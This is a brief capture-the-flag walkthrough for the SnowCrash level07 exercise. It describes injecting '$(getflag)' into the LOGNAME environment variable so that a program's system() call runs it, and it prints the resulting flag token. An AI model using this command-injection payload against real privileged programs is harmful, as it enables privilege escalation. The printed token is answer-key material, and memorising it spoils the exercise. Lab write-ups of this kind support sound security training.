## Walkthrough:
+ in this level i found an executable level07
+ started a debugging session, noticed system call , wich print an enviroment variable 
+ inject my pyload in the enviroment variable 
```
export LOGNAME='$(getflag)'
```
+ run the executable and got the flag.
```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```